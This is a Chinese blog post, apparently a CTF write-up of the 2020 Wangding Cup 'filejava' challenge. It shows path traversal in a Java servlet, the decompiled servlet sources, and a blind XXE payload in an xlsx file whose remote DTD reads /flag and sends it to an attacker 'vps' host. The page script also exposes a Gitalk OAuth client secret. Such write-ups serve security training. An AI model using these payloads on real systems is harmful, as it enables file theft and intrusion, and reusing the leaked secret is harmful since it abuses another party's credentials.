@@ -1,0 +1,460 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>2020网鼎杯青龙组filejava | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="2020网鼎杯青龙组filejava | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="2020网鼎杯青龙组filejava
+打开题目，发现一个上传点UploadServlet，随意上传一个1.txt，返回了路径/DownloadServlet?filename=1c91fcc1-ea9e-4070-94e9-68d60645..." />
+    <meta name="keywords" content="Java,文件读取,Excel-XXE" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              2020网鼎杯青龙组filejava
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-03
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Fy2ZtfAYLIY/" class="post-tag">
+                  # 文件读取
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Aw2VaPfdXTb/" class="post-tag">
+                  # Excel-XXE
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="2020网鼎杯青龙组filejava">2020网鼎杯青龙组filejava</h1>
+<p>打开题目，发现一个上传点UploadServlet，随意上传一个1.txt，返回了路径<code>/DownloadServlet?filename=1c91fcc1-ea9e-4070-94e9-68d6064516bc_1.txt</code></p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220403213056755.png" alt="image-20220403213056755" loading="lazy"></figure>
+<p>经过测试发现存在目录穿越，可以进行任意文件读取，并且在上传文件名为<code>1.txt/../../../../../../</code>的文件时，会报错并且返回web项目的绝对路径<code>/usr/local/tomcat/webapps/ROOT/WEB-INF/</code></p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220403213544841.png" alt="image-20220403213544841" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220403213754498.png" alt="image-20220403213754498" loading="lazy"></figure>
+<p>读取一下<code>web.xml</code></p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;
+         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;
+         version=&quot;4.0&quot;&gt;
+    &lt;servlet&gt;
+        &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;
+        &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;/servlet-class&gt;
+    &lt;/servlet&gt;
+
+    &lt;servlet-mapping&gt;
+        &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;
+        &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;
+    &lt;/servlet-mapping&gt;
+
+    &lt;servlet&gt;
+        &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;
+        &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;/servlet-class&gt;
+    &lt;/servlet&gt;
+
+    &lt;servlet-mapping&gt;
+        &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;
+        &lt;url-pattern&gt;/ListFileServlet&lt;/url-pattern&gt;
+    &lt;/servlet-mapping&gt;
+
+    &lt;servlet&gt;
+        &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;
+        &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;/servlet-class&gt;
+    &lt;/servlet&gt;
+
+    &lt;servlet-mapping&gt;
+        &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;
+        &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;
+    &lt;/servlet-mapping&gt;
+&lt;/web-app&gt;
+</code></pre>
+<p>根据配置内容看一下相关Class文件</p>
+<p><code>/DownloadServlet?filename=../../../../../../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class</code></p>
+<p>然后用jd-gui反编译看源码</p>
+<pre><code class="language-java">import cn.abc.servlet.DownloadServlet;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.net.URLEncoder;
+import javax.servlet.ServletException;
+import javax.servlet.ServletOutputStream;
+import javax.servlet.ServletRequest;
+import javax.servlet.ServletResponse;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+public class DownloadServlet extends HttpServlet {
+  private static final long serialVersionUID = 1L;
+  
+  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+    doPost(request, response);
+  }
+  
+  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+    String fileName = request.getParameter(&quot;filename&quot;);
+    fileName = new String(fileName.getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;);
+    System.out.println(&quot;filename=&quot; + fileName);
+    if (fileName != null &amp;&amp; fileName.toLowerCase().contains(&quot;flag&quot;)) {
+      request.setAttribute(&quot;message&quot;, &quot;禁止读取&quot;);
+      request.getRequestDispatcher(&quot;/message.jsp&quot;).forward((ServletRequest)request, (ServletResponse)response);
+      return;
+    } 
+    String fileSaveRootPath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);
+    String path = findFileSavePathByFileName(fileName, fileSaveRootPath);
+    File file = new File(path + &quot;/&quot; + fileName);
+    if (!file.exists()) {
+      request.setAttribute(&quot;message&quot;, &quot;您要下载的资源已被删除!&quot;);
+      request.getRequestDispatcher(&quot;/message.jsp&quot;).forward((ServletRequest)request, (ServletResponse)response);
+      return;
+    } 
+    String realname = fileName.substring(fileName.indexOf(&quot;_&quot;) + 1);
+    response.setHeader(&quot;content-disposition&quot;, &quot;attachment;filename=&quot; + URLEncoder.encode(realname, &quot;UTF-8&quot;));
+    FileInputStream in = new FileInputStream(path + &quot;/&quot; + fileName);
+    ServletOutputStream out = response.getOutputStream();
+    byte[] buffer = new byte[1024];
+    int len = 0;
+    while ((len = in.read(buffer)) &gt; 0)
+      out.write(buffer, 0, len); 
+    in.close();
+    out.close();
+  }
+  
+  public String findFileSavePathByFileName(String filename, String saveRootPath) {
+    int hashCode = filename.hashCode();
+    int dir1 = hashCode &amp; 0xF;
+    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;
+    String dir = saveRootPath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2;
+    File file = new File(dir);
+    if (!file.exists())
+      file.mkdirs(); 
+    return dir;
+  }
+}
+</code></pre>
+<p>这里其实就是一个文件下载的功能，过滤掉了flag，如果出现了flag，则会返回禁止读取。</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220403215337334.png" alt="image-20220403215337334" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220403215437601.png" alt="image-20220403215437601" loading="lazy"></figure>
+<p>接下来读取一下<code>UploadServlet.class</code></p>
+<pre><code class="language-java">import cn.abc.servlet.UploadServlet;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.util.List;
+import java.util.UUID;
+import javax.servlet.ServletException;
+import javax.servlet.ServletRequest;
+import javax.servlet.ServletResponse;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import org.apache.commons.fileupload.FileItem;
+import org.apache.commons.fileupload.FileItemFactory;
+import org.apache.commons.fileupload.FileUploadException;
+import org.apache.commons.fileupload.disk.DiskFileItemFactory;
+import org.apache.commons.fileupload.servlet.ServletFileUpload;
+import org.apache.poi.openxml4j.exceptions.InvalidFormatException;
+import org.apache.poi.ss.usermodel.Sheet;
+import org.apache.poi.ss.usermodel.Workbook;
+import org.apache.poi.ss.usermodel.WorkbookFactory;
+
+public class UploadServlet extends HttpServlet {
+  private static final long serialVersionUID = 1L;
+  
+  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+    doPost(request, response);
+  }
+  
+  protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+    String savePath = getServletContext().getRealPath(&quot;/WEB-INF/upload&quot;);
+    String tempPath = getServletContext().getRealPath(&quot;/WEB-INF/temp&quot;);
+    File tempFile = new File(tempPath);
+    if (!tempFile.exists())
+      tempFile.mkdir(); 
+    String message = &quot;&quot;;
+    try {
+      DiskFileItemFactory factory = new DiskFileItemFactory();
+      factory.setSizeThreshold(102400);
+      factory.setRepository(tempFile);
+      ServletFileUpload upload = new ServletFileUpload((FileItemFactory)factory);
+      upload.setHeaderEncoding(&quot;UTF-8&quot;);
+      upload.setFileSizeMax(1048576L);
+      upload.setSizeMax(10485760L);
+      if (!ServletFileUpload.isMultipartContent(request))
+        return; 
+      List&lt;FileItem&gt; list = upload.parseRequest(request);
+      for (FileItem fileItem : list) {
+        if (fileItem.isFormField()) {
+          String name = fileItem.getFieldName();
+          String str = fileItem.getString(&quot;UTF-8&quot;);
+          continue;
+        } 
+        String filename = fileItem.getName();
+        if (filename == null || filename.trim().equals(&quot;&quot;))
+          continue; 
+        String fileExtName = filename.substring(filename.lastIndexOf(&quot;.&quot;) + 1);
+        InputStream in = fileItem.getInputStream();
+        if (filename.startsWith(&quot;excel-&quot;) &amp;&amp; &quot;xlsx&quot;.equals(fileExtName))
+          try {
+            Workbook wb1 = WorkbookFactory.create(in);
+            Sheet sheet = wb1.getSheetAt(0);
+            System.out.println(sheet.getFirstRowNum());
+          } catch (InvalidFormatException e) {
+            System.err.println(&quot;poi-ooxml-3.10 has something wrong&quot;);
+            e.printStackTrace();
+          }  
+        String saveFilename = makeFileName(filename);
+        request.setAttribute(&quot;saveFilename&quot;, saveFilename);
+        request.setAttribute(&quot;filename&quot;, filename);
+        String realSavePath = makePath(saveFilename, savePath);
+        FileOutputStream out = new FileOutputStream(realSavePath + &quot;/&quot; + saveFilename);
+        byte[] buffer = new byte[1024];
+        int len = 0;
+        while ((len = in.read(buffer)) &gt; 0)
+          out.write(buffer, 0, len); 
+        in.close();
+        out.close();
+        message = &quot;文件上传成功!&quot;;
+      } 
+    } catch (FileUploadException e) {
+      e.printStackTrace();
+    } 
+    request.setAttribute(&quot;message&quot;, message);
+    request.getRequestDispatcher(&quot;/ListFileServlet&quot;).forward((ServletRequest)request, (ServletResponse)response);
+  }
+  
+  private String makeFileName(String filename) {
+    return UUID.randomUUID().toString() + &quot;_&quot; + filename;
+  }
+  
+  private String makePath(String filename, String savePath) {
+    int hashCode = filename.hashCode();
+    int dir1 = hashCode &amp; 0xF;
+    int dir2 = (hashCode &amp; 0xF0) &gt;&gt; 4;
+    String dir = savePath + &quot;/&quot; + dir1 + &quot;/&quot; + dir2;
+    File file = new File(dir);
+    if (!file.exists())
+      file.mkdirs(); 
+    return dir;
+  }
+}
+</code></pre>
+<p>这里，检测上传的文件名，如果以<code>excel-</code>开头，并且以<code>xlsx</code>结尾的话，即可触发<a href="https://www.jianshu.com/p/73cd11d83c30">excel的CVE（Bind XXE）</a></p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220403220336107.png" alt="image-20220403220336107" loading="lazy"></figure>
+<p>新建一个<code>excel-le1a.xlsx</code>，用7.zip打开文件，并将<code>[Content_Types].xml</code>的第一行内容添加为</p>
+<pre><code class="language-xml">&lt;!DOCTYPE exp [&lt;!ENTITY % remote SYSTEM 'http://vps/le1a.dtd'&gt;%remote;]&gt;&lt;exp/&gt;
+</code></pre>
+<p>然后在vps上新建一个le1a.dtd</p>
+<pre><code class="language-dtd">&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'http://vps:port/?q=%file;'&gt;&quot;&gt;
+%int;
+%send;
+</code></pre>
+<p>接着监听自己的服务器的端口，然后上传excel文件</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220403223314073.png" alt="image-20220403223314073" loading="lazy"></figure>
+<p>拿到flag:</p>
+<pre><code>flag{4573811c-bde4-4a1e-8617-1e4e29aec4c9}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#2020%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84filejava">2020网鼎杯青龙组filejava</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/2021东华杯Ezgadget复现/">
+              <h3 class="post-title">
+                2021东华杯Ezgadget复现
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
